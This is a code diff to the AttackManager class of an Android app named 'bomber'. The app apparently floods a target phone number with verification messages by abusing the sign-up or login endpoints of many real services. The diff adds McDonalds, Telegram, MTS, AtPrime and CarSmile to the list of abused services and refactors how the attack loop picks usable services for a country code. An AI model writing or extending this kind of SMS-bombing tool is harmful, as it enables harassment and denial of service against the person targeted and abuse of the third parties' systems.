@@ -3,12 +3,17 @@ package com.dm.bomber;
 import android.util.Log;
 
 import com.dm.bomber.services.Alltime;
+import com.dm.bomber.services.AtPrime;
+import com.dm.bomber.services.CarSmile;
 import com.dm.bomber.services.Citilink;
 import com.dm.bomber.services.GloriaJeans;
 import com.dm.bomber.services.ICQ;
 import com.dm.bomber.services.Kari;
+import com.dm.bomber.services.MTS;
+import com.dm.bomber.services.Mcdonalds;
 import com.dm.bomber.services.Modulebank;
 import com.dm.bomber.services.Service;
+import com.dm.bomber.services.Telegram;
 import com.dm.bomber.services.YandexEda;
 
 import org.jetbrains.annotations.NotNull;
@@ -36,7 +41,8 @@ public class AttackManager {
         this.client = new OkHttpClient();
         this.callback = callback;
         this.services = new Service[]{new Kari(), new Modulebank(), new YandexEda(),
-                new ICQ(), new Citilink(), new GloriaJeans(), new Alltime()};
+                new ICQ(), new Citilink(), new GloriaJeans(), new Alltime(), new Mcdonalds(),
+                new Telegram(), new AtPrime(), new MTS(), new CarSmile()};
     }
 
     public void performAttack(String phoneCode, String phone, int cycles) {
@@ -50,6 +56,21 @@ public class AttackManager {
 
     public void stopAttack() {
         attack._stop();
+    }
+
+    public int getServicesCount() {
+        return this.services.length;
+    }
+
+    public List<Service> getUsableServices(String phoneCode) {
+        List<Service> usableServices = new ArrayList<>();
+
+        for (Service service : services) {
+            if (service.requireCode == null || service.requireCode.equals(phoneCode))
+                usableServices.add(service);
+        }
+
+        return usableServices;
     }
 
     public interface AttackCallback {
@@ -66,7 +87,7 @@ public class AttackManager {
         private final int numberOfCycles;
 
         private int progress = 0;
-        private boolean work = true;
+        private boolean status = true;
 
         private CountDownLatch tasks;
 
@@ -81,17 +102,12 @@ public class AttackManager {
         }
 
         public void _stop() {
-            work = false;
+            status = false;
         }
 
         @Override
         public void run() {
-            usableServices = new ArrayList<>();
-
-            for (Service service : services) {
-                if (service.requireCode == null || service.requireCode.equals(phoneCode))
-                    usableServices.add(service);
-            }
+            usableServices = getUsableServices(phoneCode);
 
             callback.onAttackStart(usableServices.size(), numberOfCycles);
 
@@ -118,7 +134,7 @@ public class AttackManager {
                         }
                     });
 
-                    if (!work) {
+                    if (!status) {
                         callback.onAttackEnd();
                         return;
                     }
